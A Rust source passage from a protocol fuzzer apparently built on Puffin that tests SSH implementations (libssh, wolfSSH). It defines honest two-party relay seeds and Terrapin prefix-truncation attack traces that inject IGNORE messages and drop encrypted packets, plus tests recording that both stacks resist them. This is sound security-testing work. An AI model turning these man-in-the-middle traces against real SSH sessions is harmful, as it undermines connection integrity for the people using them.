// ── Two-party relay seeds (a real client PUT against a real server PUT) ──────
//
// The attacker only relays. Messages are addressed by TYPE, never by raw
// position: `[Banner]` / `[MsgType(n)]` for the cleartext phase and the n-th
// `[OnWire]` chunk (opaque ciphertext) for the encrypted phase; the flight relay
// forwards each agent's n-th non-empty output flight. (The seeds used to address
// `(agent, n)/OnWireData` and lockstep flight indices, which stopped resolving
// when encrypted chunks became `RawSshMessage` knowledge — every one of them
// failed mid-relay on both stacks before reaching its point.) Every relay step is
// followed by an output pump of the receiver: libssh sometimes needs one more
// progress round to emit its reply (e.g. to a batched EXT_INFO + SERVICE_ACCEPT),
// and an empty pump adds no knowledge, so indices stay aligned across stacks.
// `tests::two_party_seeds_reach_their_verdict` locks each seed's outcome on
// both PUTs.

/// Client + server descriptors shared by the two-party seeds.
fn two_party_descriptors(
    client: AgentName,
    server: AgentName,
) -> Vec<AgentDescriptor<SshDescriptorConfig>> {
    [(client, AgentType::Client), (server, AgentType::Server)]
        .into_iter()
        .map(|(name, typ)| {
            AgentDescriptor::from_config(
                name,
                SshDescriptorConfig {
                    typ,
                    try_reuse: false,
                    ..Default::default()
                },
            )
        })
        .collect()
}

/// Deliver the `n`-th message of kind `m` that `from` emitted to `to`, then pump
/// `to` once.
fn relay_msg(
    to: AgentName,
    from: AgentName,
    m: SshQueryMatcher,
    n: u16,
) -> [Step<SshProtocolTypes>; 2] {
    [
        InputAction::new_step(to, term! { (from, n)[Some(m)]/RawSshMessage }),
        OutputAction::new_step(to),
    ]
}

/// Deliver `from`'s `n`-th non-empty output flight to `to`, then pump `to` once.
fn relay_flight(to: AgentName, from: AgentName, n: u16) -> [Step<SshProtocolTypes>; 2] {
    [
        InputAction::new_step(to, term! { (from, n)/RawSshMessageFlight }),
        OutputAction::new_step(to),
    ]
}

/// Inject a cleartext `SSH_MSG_IGNORE` into `to` (Terrapin's sequence-number
/// bump), then pump `to` once.
fn inject_ignore(to: AgentName) -> [Step<SshProtocolTypes>; 2] {
    [
        InputAction::new_step(to, term! { fn_packet((fn_ignore((fn_ssh_bytes_empty)))) }),
        OutputAction::new_step(to),
    ]
}

/// Cleartext phase of the packet relay, message by message: banners, KEXINITs,
/// ECDH_INIT / ECDH_REPLY. Stops BEFORE the NEWKEYS exchange so a Terrapin seed can
/// splice its IGNORE in front of either NEWKEYS.
fn relay_kex_messages(client: AgentName, server: AgentName) -> Vec<Step<SshProtocolTypes>> {
    use SshQueryMatcher::{Banner, MsgType};
    let mut steps = vec![
        OutputAction::new_step(client),
        OutputAction::new_step(server),
    ];
    for (to, from, m) in [
        (server, client, Banner),
        (client, server, Banner),
        (server, client, MsgType(20)), // KEXINIT
        (client, server, MsgType(20)),
        (server, client, MsgType(30)), // KEX_ECDH_INIT
        (client, server, MsgType(31)), // KEX_ECDH_REPLY
    ] {
        steps.extend(relay_msg(to, from, m, 0));
    }
    steps
}

/// Encrypted phase of the packet relay: forward the server's `[OnWire]` chunks
/// `s2c` and the client's `c2s` alternately (server chunk first — the server's
/// first post-NEWKEYS chunk is its EXT_INFO, emitted before the client says
/// anything). Chunk k of each side is its reply to the other side's previous one;
/// the full client flow is 6 server / 5 client chunks (EXT_INFO, SERVICE,
/// none-auth FAILURE, password SUCCESS, CHANNEL_OPEN, shell).
fn relay_encrypted(
    client: AgentName,
    server: AgentName,
    s2c: std::ops::Range<u16>,
    c2s: std::ops::Range<u16>,
) -> Vec<Step<SshProtocolTypes>> {
    let mut steps = Vec::new();
    let (mut s, mut c) = (s2c.peekable(), c2s.peekable());
    while s.peek().is_some() || c.peek().is_some() {
        if let Some(n) = s.next() {
            steps.extend(relay_msg(client, server, SshQueryMatcher::OnWire, n));
        }
        if let Some(n) = c.next() {
            steps.extend(relay_msg(server, client, SshQueryMatcher::OnWire, n));
        }
    }
    steps
}

/// Two-honest-party handshake at FLIGHT granularity: the attacker forwards each
/// party's n-th output flight to the other faithfully (the benign baseline), so
/// each PUT's I/O batching is preserved. This is the trace shape required for
/// the *matching-conversation* property — only definable with two honest
/// endpoints. Mutations (drop / insert / reorder relayed flights) are what a
/// transcript-integrity attack like Terrapin exercises. Both peers complete the
/// whole client flow (8 flights each way: banner, KEXINIT, ECDH, NEWKEYS+SERVICE,
/// none-auth, password, CHANNEL_OPEN, shell) and reach DONE on libssh and wolfSSH.
pub fn seed_handshake_two_party(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    let mut steps = vec![
        OutputAction::new_step(client),
        OutputAction::new_step(server),
    ];
    for n in 0..8 {
        steps.extend(relay_flight(server, client, n));
        steps.extend(relay_flight(client, server, n));
    }
    Trace {
        prior_traces: vec![],
        descriptors: two_party_descriptors(client, server),
        steps,
        ..Default::default()
    }
}

/// Hybrid c2s Terrapin attempt: relay the KEX at FLIGHT granularity (preserving
/// batching), (a) insert a cleartext IGNORE into the server before the client's
/// NEWKEYS — bumping the server's c2s receive sequence number — and (b) forward
/// only the client's NEWKEYS, DROPPING the SERVICE_REQUEST the client batched
/// into the same flight (its first encrypted packet).
///
/// Outcome (locked by `tests::two_party_seeds_reach_their_verdict`): libssh's
/// strict-kex server rejects the IGNORE during KEX ("unexpected packets in
/// strict KEX mode") — the Terrapin mitigation. wolfSSH (no strict-kex) accepts
/// the IGNORE, but the truncation cannot be completed in the c2s direction: the
/// dropped SERVICE_REQUEST is mandatory and the client sends nothing else until
/// it is answered, so there is no later packet to realign on and the session
/// stalls (neither side reaches DONE). The viable direction is s2c
/// ([`seed_terrapin_s2c`]).
pub fn seed_terrapin_attempt(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    let mut steps = vec![
        OutputAction::new_step(client),
        OutputAction::new_step(server),
    ];
    for n in 0..3 {
        // banner, KEXINIT, ECDH_INIT / ECDH_REPLY+NEWKEYS(+EXT_INFO)
        steps.extend(relay_flight(server, client, n));
        steps.extend(relay_flight(client, server, n));
    }
    steps.extend(inject_ignore(server)); // (a)
    steps.extend(relay_msg(server, client, SshQueryMatcher::MsgType(21), 0)); // (b) NEWKEYS only
    Trace {
        prior_traces: vec![],
        descriptors: two_party_descriptors(client, server),
        steps,
        ..Default::default()
    }
}

/// Packet-granular c2s Terrapin attempt: the same attack as
/// [`seed_terrapin_attempt`] on the packet relay (every KEX message its own
/// droppable step). Relay the KEX, deliver the server's NEWKEYS, (a) insert a
/// cleartext IGNORE into the server, deliver the client's NEWKEYS, and (b) drop
/// the client's first encrypted packet (SERVICE_REQUEST) by never forwarding it,
/// while still forwarding the server's first encrypted chunk (EXT_INFO).
///
/// Same outcome as the flight variant: libssh's strict-kex rejects the IGNORE;
/// wolfSSH accepts it but stalls, because c2s has no later packet to realign on
/// (the client waits for SERVICE_ACCEPT). Kept as the minimal c2s counter-example.
pub fn seed_terrapin_packet(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    use SshQueryMatcher::MsgType;
    let mut steps = relay_kex_messages(client, server);
    steps.extend(relay_msg(client, server, MsgType(21), 0)); // server NEWKEYS
    steps.extend(inject_ignore(server)); // (a)
    steps.extend(relay_msg(server, client, MsgType(21), 0)); // client NEWKEYS
    steps.extend(relay_encrypted(client, server, 0..1, 0..0)); // (b) EXT_INFO only; c2s 0 dropped
    Trace {
        prior_traces: vec![],
        descriptors: two_party_descriptors(client, server),
        steps,
        ..Default::default()
    }
}

/// S2C Terrapin prefix truncation (the direction the c2s attempts show is
/// needed). The honest packet relay of
/// [`seed_handshake_two_party_packet_complete`] with exactly the two Terrapin
/// mutations applied: (a) insert a cleartext IGNORE into the CLIENT just before
/// the server's NEWKEYS (+1 on the client's s2c receive sequence number), and
/// (b) DROP the server's first encrypted chunk — its EXT_INFO, which is
/// ignorable — forwarding every later server chunk unchanged. With a
/// sequence-number-keyed AEAD (chacha20-poly1305 / EtM) the +1 and the −1
/// cancel, the tags verify, and the client completes having never seen
/// EXT_INFO: the matching-conversation oracle's case.
///
/// Outcome here (locked by `tests::two_party_seeds_reach_their_verdict`): not
/// exploitable on either stack. libssh's strict-kex client rejects the IGNORE
/// during KEX. wolfSSH (no strict-kex) accepts it, but the pinned cipher is
/// AES-GCM, whose nonce is an invocation counter independent of the sequence
/// number, so the next forwarded chunk fails its tag and the session never
/// completes — consistent with wolfSSH lacking the Terrapin-affected ciphers.
pub fn seed_terrapin_s2c(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    use SshQueryMatcher::MsgType;
    let mut steps = relay_kex_messages(client, server);
    steps.extend(inject_ignore(client)); // (a)
    steps.extend(relay_msg(client, server, MsgType(21), 0)); // server NEWKEYS
    steps.extend(relay_msg(server, client, MsgType(21), 0)); // client NEWKEYS
                                                             // (b) s2c chunk 0 (EXT_INFO) dropped: the server's chunk k+1 is its reply to
                                                             // the client's chunk k, so each client chunk is forwarded first.
    for n in 0..5 {
        steps.extend(relay_msg(server, client, SshQueryMatcher::OnWire, n));
        steps.extend(relay_msg(client, server, SshQueryMatcher::OnWire, n + 1));
    }
    Trace {
        prior_traces: vec![],
        descriptors: two_party_descriptors(client, server),
        steps,
        ..Default::default()
    }
}

/// HONEST completing packet-granular two-party relay — the Terrapin discovery
/// substrate. A real client PUT against a real server PUT, relayed message by
/// message: the cleartext phase by type (`[Banner]`, `[MsgType(20|30|31|21)]`),
/// the encrypted phase chunk by chunk (`[OnWire]`, the n-th opaque chunk each
/// side emitted). Faithful: NO injected IGNORE, and the server's first encrypted
/// chunk (EXT_INFO) is forwarded in order with the rest. Both peers complete the
/// whole client flow (service, none + password auth, session channel, shell) and
/// reach DONE on libssh AND wolfSSH — locked by
/// `tests::two_party_seeds_reach_their_verdict`.
///
/// From here the Terrapin attack is exactly TWO mutations away: (1) skip the
/// `(server, 0)[OnWire]` forward (drop EXT_INFO), and (2) insert a cleartext
/// IGNORE to the client before the server's NEWKEYS. The +1 from the IGNORE
/// cancels the −1 from the skip, so the later `[OnWire]` forwards realign and
/// tags stay valid — letting a matching-conversation oracle fire. (The relay used
/// to address raw positions, `(server, n)/OnWireData`; that stopped resolving
/// when encrypted chunks became `RawSshMessage` knowledge, so the seed silently
/// failed at its first encrypted forward on both stacks.)
///
/// Not in the differential corpus: the attacker only relays and knows neither
/// peer's ECDH secret, so the encrypted layer cannot be decrypted and compared —
/// only the cleartext prefix and claims would be. Its value is as a single-PUT /
/// security-oracle substrate.
pub fn seed_handshake_two_party_packet_complete(
    client: AgentName,
    server: AgentName,
) -> Trace<SshProtocolTypes> {
    use SshQueryMatcher::MsgType;
    let mut steps = relay_kex_messages(client, server);
    steps.extend(relay_msg(client, server, MsgType(21), 0)); // server NEWKEYS
    steps.extend(relay_msg(server, client, MsgType(21), 0)); // client NEWKEYS
    steps.extend(relay_encrypted(client, server, 0..6, 0..5));
    Trace {
        prior_traces: vec![],
        descriptors: two_party_descriptors(client, server),
        steps,
        ..Default::default()
    }
}

/// AES-256-GCM counterpart of the (commented-out, legacy ChaCha20)
/// `server_decryption_recipes`, for the AES-GCM
/// flow (mirrors `seed_client_attacker_full_aesgcm`). Decrypts the server's
/// first three post-NewKeys s2c packets. The GCM invocation counter restarts at
/// 0 at NewKeys, so it matches the per-direction packet index directly (no
/// strict/non-strict ambiguity as in the ChaCha20 case).
///
/// REQUIRES A CLAIMER-INSTRUMENTED SERVER PUT. The exchange hash H is read from
/// the server's completion claim (`fn_claim_exchange_hash`), so a PUT built
/// WITHOUT the `claimer` instrumentation (no `-DHAS_CLAIMS`, hence no session-id
/// claim) yields no H → this recipe errors and is skipped → that PUT's encrypted
/// s2c layer is NOT decoded or compared. In the cross-vendor campaign both
/// libssh0114-asan and wolfssh150-asan are claimer-instrumented, so this holds.
/// KNOWN CONSEQUENCE: the version campaign's `libssh0104-asan` (and
/// `libssh0803-asan`) are currently NOT claimer-instrumented, so their s2c
/// decryption is inert until they are rebuilt with the claim patch. This is an
/// accepted, documented limitation of sourcing H from the claim (it traded the
/// old wire-reconstruction — which worked for any PUT but desynced under KEXINIT
/// mutation — for correctness-under-mutation on instrumented PUTs).
pub fn server_decryption_recipes_aesgcm(server: AgentName) -> Vec<Term<SshProtocolTypes>> {
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // Exchange hash H is sourced from the SERVER's own completion claim (its SSH
    // session id) rather than reconstructed from the client KEXINIT. H binds the
    // KEXINIT the server ACTUALLY negotiated, so this is correct for every seed —
    // notably ext_info (curve25519 + ext-info-c), whose KEXINIT differs from the
    // plain AES-GCM offer the old reconstruction hard-coded — and it stays correct
    // under negotiation/downgrade mutation, where a hard-coded reconstructed I_C
    // would desync from the mutated KEXINIT and silently break s2c decryption
    // (the whole encrypted layer would go uncompared). The shared secret K is
    // still reconstructed from the wire (attacker's ephemeral priv + server Q_S);
    // only H moves to the claim. See `fn_claim_exchange_hash`.
    let exch_hash = term! { fn_claim_exchange_hash(((server, 0))) };
    let key = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    // The server's post-NewKeys s2c AES-GCM counter is CONTINUOUS across the whole
    // stream, so the full transcript is only recoverable by concatenating ALL of
    // the server's per-step output drains and peeling continuously from counter 0.
    // Puffin drains after every step, so the drain count varies per trace (and
    // even differs between the two PUTs, which batch their replies differently).
    // The `(server, *)` "concatenate-all" query resolves to EVERY server
    // `RawSshMessageFlight` joined in emission order — the whole s2c stream as one
    // flight — so a SINGLE fold recovers the complete transcript regardless of how
    // many drains there are or how each stack batched them. Exactly one
    // `AlignedTranscript` is emitted per PUT and the two are compared 1:1 (no
    // per-drain prefixes, hence no batching-induced false positives).
    vec![term! { fn_fold_s2c_transcript(((server, *)/RawSshMessageFlight), (@key), (@iv)) }]
}

/// Differential-fuzzing decryption recipe for a **client** PUT agent (c2s) — the
/// mirror of [`server_decryption_recipes_aesgcm`].
///
/// When the attacker plays the SERVER (the server-attacker seeds / client-parser
/// fuzzing), the PUT is the client and its post-NewKeys output (SERVICE_REQUEST,
/// USERAUTH_REQUEST, channel traffic, …) is opaque AES-GCM ciphertext. Without
/// this recipe that whole client→server stream goes uncompared, so the
/// differential only ever saw the clients' plaintext KEX and their claims.
///
/// Key material mirrors the s2c recipe with the roles swapped:
///   * K = ECDH(attacker-server ephemeral private key, Q_C). The server-attacker seeds use the
///     fixed `fn_client_ecdh_privkey` as that key (they send `fn_client_ecdh_pubkey` in
///     KEX_ECDH_REPLY), and Q_C is the client's ephemeral public key, queried exactly as the seed
///     does (`(client, 0)[None]/SshBytes`).
///   * H is sourced from the CLIENT's own completion claim (session id) — both harnesses emit the
///     handshake claim for the client role too — for the same mutation-robustness reason as the s2c
///     recipe.
///   * The c2s key/IV (RFC 4253 §7.2 letters 'C'/'A'), and the direction-agnostic
///     `fn_fold_s2c_transcript` (a plain GCM peel from counter 0 over the concatenated flight;
///     despite its name it does not assume a direction).
///
/// If the attacker's ephemeral key was mutated away from `fn_client_ecdh_privkey`,
/// K is wrong, the fold decrypts nothing, and the comparison degrades to the
/// plaintext prefix — the same best-effort behaviour as the s2c recipe.
pub fn client_decryption_recipes_aesgcm(client: AgentName) -> Vec<Term<SshProtocolTypes>> {
    let q_c = term! { (client, 0)[None]/SshBytes };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@q_c)) };
    let exch_hash = term! { fn_claim_exchange_hash(((client, 0))) };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    vec![term! { fn_fold_s2c_transcript(((client, *)/RawSshMessageFlight), (@key), (@iv)) }]
}

#[cfg(test)]
mod tests {
    use puffin::trace::Action;

    use super::*;

    /// Serialises the tests that EXECUTE PUTs. Each PUT's deterministic RNG is
    /// process-global (libssh: OpenSSL RAND_METHOD + one static seed in
    /// harness/libssh/src/rng.c; wolfSSH: one seed stream), and `cargo test` runs
    /// tests on parallel threads: two PUT executions interleaving their draws make
    /// each other nondeterministic. (This, not the PUT, is why libssh once looked
    /// nondeterministic "by attempt 4".) Hold it for the whole execution.
    static PUT_EXEC_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    fn put_exec_lock() -> std::sync::MutexGuard<'static, ()> {
        PUT_EXEC_LOCK.lock().unwrap_or_else(|e| e.into_inner())
    }

    /// Emits the H2/H3 out-of-spec banner probe traces to `/tmp/banner_probe/`
    /// for `differential-execute libssh0114 wolfssh150 <trace>`. `#[ignore]`: run
    /// on demand (`cargo test emit_banner_probe_traces -- --ignored`), not in CI.
    #[test]
    #[ignore]
    fn emit_banner_probe_traces() {
        use puffin::libafl::inputs::Input;
        let server = AgentName::first();
        let dir = std::path::Path::new("/tmp/banner_probe");
        std::fs::create_dir_all(dir).unwrap();
        let cases: Vec<(&str, Term<SshProtocolTypes>, Term<SshProtocolTypes>)> = vec![
            // CONTROL: canonical banner through the SAME builder — MUST be 0-diff,
            // else a probe diff is a builder artifact, not a stack divergence.
            (
                "banner_control",
                term! { fn_puffin_banner },
                term! { fn_puffin_id },
            ),
            (
                "banner_oversized",
                term! { fn_banner_wire_oversized },
                term! { fn_vc_oversized },
            ),
            (
                "banner_ctrl",
                term! { fn_banner_wire_ctrl },
                term! { fn_vc_ctrl },
            ),
        ];
        for (name, wire, vc) in cases {
            let trace = banner_probe_seed(server, wire, vc);
            trace
                .to_file(dir.join(format!("{name}.trace")))
                .unwrap_or_else(|e| panic!("write {name}: {e}"));
            println!("wrote /tmp/banner_probe/{name}.trace");
        }
    }

    /// Materialises the four by-design DIVERGENT probe reproducers to
    /// `/tmp/eval_probes/` so they can be replayed with
    /// `differential-execute libssh0114 wolfssh150 <trace>`:
    ///   * `bad_service`       — USERAUTH_REQUEST with service != "ssh-connection" (wolfSSH
    ///     accepts, libssh rejects; RFC 4252 §5),
    ///   * `unknown_msg`       — unknown high-numbered message pre-auth (libssh tolerates per
    ///     §11.4, wolfSSH aborts),
    ///   * `dh_bad_exponent`   — DH e=0 (both reject: a true 0-diff control),
    ///   * `kexinit_injection` — traffic during an incomplete peer-initiated rekey (RFC 4253 §7.1;
    ///     wolfSSH processes, libssh withholds).
    ///
    /// These seeds are deliberately kept OUT of the 0-diff differential corpus —
    /// they diverge BY DESIGN, so registering them would break the corpus-
    /// composition invariant (see `differential_corpus_composition_invariant`).
    /// This emitter is the supported way to produce them for a demonstration /
    /// evaluation run. `#[ignore]`: it writes files to disk on demand
    /// (`cargo test emit_eval_probe_traces -- --ignored`), so it is not part of CI.
    #[test]
    #[ignore]
    fn emit_eval_probe_traces() {
        use puffin::libafl::inputs::Input;
        let server = AgentName::first();
        let dir = std::path::Path::new("/tmp/eval_probes");
        std::fs::create_dir_all(dir).unwrap();
        let cases: Vec<(&str, Trace<SshProtocolTypes>)> = vec![
            ("bad_service", seed_client_attacker_bad_service(server)),
            ("unknown_msg", seed_client_attacker_unknown_msg(server)),
            (
                "dh_bad_exponent",
                seed_client_attacker_dh_bad_exponent(server),
            ),
            (
                "kexinit_injection",
                seed_client_attacker_kexinit_injection(server),
            ),
        ];
        for (name, trace) in cases {
            trace
                .to_file(dir.join(format!("{name}.trace")))
                .unwrap_or_else(|e| panic!("write {name}: {e}"));
            println!("wrote /tmp/eval_probes/{name}.trace");
        }
    }

    /// Materialises the server-attacker seed (attacker plays the SERVER, the PUT is
    /// the CLIENT) to `/tmp/server_attacker/` for a CLIENT-side differential run:
    /// `differential-execute libssh0114 wolfssh150 /tmp/server_attacker/<name>.trace`.
    /// Kept out of the differential corpus (see `build_corpus`); this emitter is the
    /// supported way to produce it for evaluating client-side (c2s) comparison.
    /// `#[ignore]`: writes files on demand
    /// (`cargo test emit_server_attacker_trace -- --ignored`), not part of CI.
    #[test]
    #[ignore]
    fn emit_server_attacker_trace() {
        use puffin::libafl::inputs::Input;
        let client = AgentName::first();
        let dir = std::path::Path::new("/tmp/server_attacker");
        std::fs::create_dir_all(dir).unwrap();
        let name = "seed_server_attacker_full_aesgcm";
        seed_server_attacker_full_aesgcm(client)
            .to_file(dir.join(format!("{name}.trace")))
            .unwrap_or_else(|e| panic!("write {name}: {e}"));
        println!("wrote /tmp/server_attacker/{name}.trace");
    }

    /// Materialises the session-requests seed to `/tmp/session_requests/` for
    /// `differential-execute`. `#[ignore]`: on-demand, not part of CI.
    #[test]
    #[ignore]
    fn emit_session_requests_trace() {
        use puffin::libafl::inputs::Input;
        let server = AgentName::first().next();
        let dir = std::path::Path::new("/tmp/session_requests");
        std::fs::create_dir_all(dir).unwrap();
        let name = "seed_client_attacker_session_requests";
        seed_client_attacker_session_requests(server)
            .to_file(dir.join(format!("{name}.trace")))
            .unwrap_or_else(|e| panic!("write {name}: {e}"));
        println!("wrote /tmp/session_requests/{name}.trace");
    }

    /// Materialises the data-dependent round-trip seeds to `/tmp/roundtrip_seeds/`
    /// for `differential-execute`. `#[ignore]`: on-demand, not part of CI.
    #[test]
    #[ignore]
    fn emit_roundtrip_seeds() {
        use puffin::libafl::inputs::Input;
        let a = AgentName::first();
        let dir = std::path::Path::new("/tmp/roundtrip_seeds");
        std::fs::create_dir_all(dir).unwrap();
        for (name, trace) in [
            ("rekey_complete", seed_client_attacker_rekey_complete(a)),
            ("server_session", seed_server_attacker_session_aesgcm(a)),
            ("pubkey_query", seed_client_attacker_pubkey_query(a)),
            ("flow_control", seed_client_attacker_flow_control(a)),
        ] {
            trace
                .to_file(dir.join(format!("{name}.trace")))
                .unwrap_or_else(|e| panic!("write {name}: {e}"));
            println!("wrote /tmp/roundtrip_seeds/{name}.trace");
        }
    }

    /// Every two-party / Terrapin relay seed must reach ITS verdict on each built
    /// PUT — not die on an unresolvable relay query first (they all used to):
    ///   * the honest relays (flight and packet granularity) complete, both agents DONE;
    ///   * on libssh, every Terrapin variant is stopped by strict-kex (the injected IGNORE during
    ///     KEX is rejected);
    ///   * on wolfSSH (no strict-kex), the c2s variants run to the end but stall (no later c2s
    ///     packet to realign on), and the s2c variant fails the client's AES-GCM tag check
    ///     (`AES_GCM_AUTH_E` = -180: GCM nonces do not follow the sequence number, so the
    ///     truncation cannot be hidden).
    #[cfg(all(has_put = "libssh0114", has_put = "wolfssh150"))]
    #[test]
    fn two_party_seeds_reach_their_verdict() {
        use puffin::put::{PutDescriptor, PutOptions};
        use puffin::trace::{Spawner, TraceContext};

        use crate::put_registry::ssh_registry;

        #[derive(Debug)]
        enum Verdict {
            BothDone,
            StrictKexReject,
            Stall,
            GcmTagFailure,
        }
        use Verdict::*;

        let client = AgentName::first();
        let server = client.next();
        type Seed = fn(AgentName, AgentName) -> Trace<SshProtocolTypes>;
        let cases: [(&str, Seed, Verdict, Verdict); 5] = [
            ("two_party", seed_handshake_two_party, BothDone, BothDone),
            (
                "two_party_packet_complete",
                seed_handshake_two_party_packet_complete,
                BothDone,
                BothDone,
            ),
            (
                "terrapin_attempt",
                seed_terrapin_attempt,
                StrictKexReject,
                Stall,
            ),
            (
                "terrapin_packet",
                seed_terrapin_packet,
                StrictKexReject,
                Stall,
            ),
            (
                "terrapin_s2c",
                seed_terrapin_s2c,
                StrictKexReject,
                GcmTagFailure,
            ),
        ];
        let _exec = put_exec_lock();
        let mut failures = Vec::new();
        for (name, seed, on_libssh, on_wolfssh) in &cases {
            for (put, want) in [("libssh0114", on_libssh), ("wolfssh150", on_wolfssh)] {
                let desc = PutDescriptor::new(put, PutOptions::default());
                let spawner = Spawner::new(ssh_registry())
                    .with_mapping(&[(client, desc.clone()), (server, desc)]);
                let mut ctx = TraceContext::new(spawner);
                let res = seed(client, server).execute(&mut ctx, &mut 0, false);
                let states = format!(
                    "{:?} / {:?}",
                    ctx.find_agent(client),
                    ctx.find_agent(server)
                );
                let ok = match (want, &res) {
                    (BothDone, Ok(())) => ctx.agents_successful(),
                    (Stall, Ok(())) => !ctx.agents_successful(),
                    (StrictKexReject, Err(e)) => e.to_string().contains("strict KEX"),
                    (GcmTagFailure, Err(_)) => states.contains("gerr=-180"),
                    _ => false,
                };
                if !ok {
                    failures.push(format!(
                        "{name} on {put}: want {want:?}, got {res:?}; {states}"
                    ));
                }
            }
        }
        assert!(
            failures.is_empty(),
            "two-party verdicts:\n{}",
            failures.join("\n")
        );
    }

    /// The data-dependent server-attacker session must take BOTH client PUTs all the
    /// way to DONE (channel confirmed on the channel number each client chose, shell
    /// request answered) — i.e. the attacker really read the client's CHANNEL_OPEN
    /// from its encrypted stream and replied on the right channel.
    #[cfg(all(has_put = "libssh0114", has_put = "wolfssh150"))]
    #[test]
    fn server_session_clients_reach_done() {
        use puffin::put::{PutDescriptor, PutOptions};
        use puffin::trace::{Spawner, TraceContext};

        use crate::put_registry::ssh_registry;

        let client = AgentName::first();
        let _exec = put_exec_lock();
        for put in ["libssh0114", "wolfssh150"] {
            let desc = PutDescriptor::new(put, PutOptions::default());
            let spawner = Spawner::new(ssh_registry()).with_mapping(&[(client, desc)]);
            let mut ctx = TraceContext::new(spawner);
            seed_server_attacker_session_aesgcm(client)
                .execute(&mut ctx, &mut 0, false)
                .unwrap_or_else(|e| panic!("{put}: server-attacker session failed: {e}"));
            assert!(
                ctx.agents_successful(),
                "{put}: client did not reach DONE: {:?}",
                ctx.find_agent(client)
            );
        }
    }

    /// Materialises the two-party relay seeds (a real client PUT against a real
    /// server PUT) to `/tmp/two_party/` for `-T <put> display-execute`, e.g. to
    /// check that a client-harness change did not shift their relay step
    /// alignment. `#[ignore]`: on-demand (`cargo test emit_two_party_traces --
    /// --ignored`), not part of CI.
    #[test]
    #[ignore]
    fn emit_two_party_traces() {
        use puffin::libafl::inputs::Input;
        let client = AgentName::first();
        let server = client.next();
        let dir = std::path::Path::new("/tmp/two_party");
        std::fs::create_dir_all(dir).unwrap();
        let cases: Vec<(&str, Trace<SshProtocolTypes>)> = vec![
            (
                "handshake_two_party",
                seed_handshake_two_party(client, server),
            ),
            (
                "handshake_two_party_packet_complete",
                seed_handshake_two_party_packet_complete(client, server),
            ),
            ("terrapin_attempt", seed_terrapin_attempt(client, server)),
            ("terrapin_packet", seed_terrapin_packet(client, server)),
            ("terrapin_s2c", seed_terrapin_s2c(client, server)),
        ];
        for (name, trace) in cases {
            trace
                .to_file(dir.join(format!("{name}.trace")))
                .unwrap_or_else(|e| panic!("write {name}: {e}"));
            println!("wrote /tmp/two_party/{name}.trace");
        }
    }

    /// E.A — corpus-composition invariant (CI guard for the "0-diff corpus stays
    /// 0-diff" property, WITHOUT needing to run PUTs).
    ///
    /// The differential corpus MUST contain only seeds that are 0-diff on the
    /// libssh-vs-wolfSSH pair (raw, or 0-diff after a documented shadow). A future
    /// edit that registers a by-design-DIVERGENT probe here would silently break
    /// that invariant: the divergent seed is consumed as an objective on load and
    /// starves/floods the differential campaign (observed empirically). This test
    /// fails loudly if that happens.
    ///
    /// It runs under default features (no rich-corpus), so `build_corpus()` is the
    /// differential set. Runtime 0-diff verification itself is an integration check
    /// (needs both built PUTs) done by the campaign scripts / differential-execute;
    /// this unit test guards the *composition* that must hold for that to pass.
    #[test]
    fn differential_corpus_composition_invariant() {
        let names: Vec<&str> = build_corpus().into_iter().map(|(_, n)| n).collect();

        // (1) the legit flows that MUST be present (incl. this session's additions).
        for want in [
            "seed_client_attacker_full_aesgcm",
            "seed_client_attacker_pubkey_aesgcm",
            "seed_client_attacker_passwd_change", // item-6 positive control
            "seed_client_attacker_forwarding",    // fwd flow (port-echo shadowed)
            "seed_server_attacker_full_aesgcm",   // CLIENT-parser differential (c2s)
            "seed_client_attacker_session_requests", // several dependent round-trips
            "seed_client_attacker_rekey_complete", // keys from the server's rekey replies
            "seed_server_attacker_session_aesgcm", // replies built from the client's c2s
            "seed_client_attacker_pubkey_query",  // signs the blob echoed in PK_OK
            "seed_client_attacker_flow_control",  // data sized from the server's window
        ] {
            assert!(
                names.contains(&want),
                "differential corpus is missing legit seed {want:?}; corpus={names:?}"
            );
        }

        // (2) the by-design DIVERGENT probe seeds that must NEVER be registered in
        // ANY corpus (they diverge on purpose and would starve/flood a campaign).
        // Each is kept only as a callable reproducer (see the create_corpus NOTE).
        for forbidden in [
            "seed_client_attacker_bad_service", // auth-service divergence repro
            "seed_client_attacker_unknown_msg", // item-7 pre-auth unknown message
            "seed_client_attacker_dh_bad_exponent", // item-1 out-of-range DH exponent
        ] {
            assert!(
                !names.contains(&forbidden),
                "DIVERGENT probe {forbidden:?} must NOT be in the corpus (would break \
                 the 0-diff invariant); corpus={names:?}"
            );
        }

        // (3) no duplicate registration (a dup would double-load / skew campaigns).
        let mut sorted = names.clone();
        sorted.sort_unstable();
        sorted.dedup();
        assert_eq!(
            sorted.len(),
            names.len(),
            "duplicate seed name(s) in the corpus; corpus={names:?}"
        );

        // (4) sanity: the differential corpus is non-trivial.
        assert!(
            names.len() >= 4,
            "differential corpus unexpectedly small: {names:?}"
        );
    }

    /// (Input steps, Output steps) of a trace.
    fn io_counts(trace: &Trace<SshProtocolTypes>) -> (usize, usize) {
        let inputs = trace
            .steps
            .iter()
            .filter(|s| matches!(s.action, Action::Input(_)))
            .count();
        (inputs, trace.steps.len() - inputs)
    }

    // The credential-confusion seeds must build without panicking and carry the
    // full publickey handshake (8 inputs: banner + kexinit + ecdh + newkeys +
    // svc_req + auth_req + two more: chan_open + chan_req for pubkey_b, two IGNORE
    // pumps for the others), each reply read by an explicit Output.
    // Type-correctness is enforced by the term! macro at compile time; this guards
    // the shape.
    #[test]
    fn credential_confusion_seeds_build() {
